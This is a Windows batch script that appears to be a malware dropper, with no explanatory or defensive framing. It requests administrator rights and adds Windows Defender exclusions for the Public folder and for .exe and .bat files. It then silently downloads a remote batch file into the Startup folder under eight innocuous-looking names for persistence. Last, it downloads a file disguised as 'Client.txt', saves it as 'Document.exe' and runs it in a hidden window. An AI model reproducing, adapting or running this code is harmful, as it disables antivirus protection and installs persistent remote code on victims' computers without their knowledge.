@whoami /groups | find "S-1-16-12288" > nul
@if errorlevel 1 echo Start-Process cmd '/C ""%~f0" %*"' -Verb RunAs | PowerShell - & exit /b

:: Displays the original command line that invoked the Command Processor
echo %CMDCMDLINE%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath C:\Users\Public""' -Verb RunAs"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .exe""' -Verb RunAs"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .bat""' -Verb RunAs"
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\ANTI.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\BOOT2.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\RESTART.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\Minicaculator.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\BOOT.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\SETTING.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\AUDIO.bat";
powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\FIX.bat";

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell -windowstyle hidden Invoke-WebRequest -URI https://serverwebhook.000webhostapp.com/Client.txt -OutFile C:\\Users\\Public\\Document.exe;
powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Document.exe"
powershell -windowstyle hidden Invoke-WebRequest -URI https://serverwebhook.000webhostapp.com/Client.txt -OutFile C:\\Users\\Public\\Document.exe;
powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Document.exe"
pause >nul
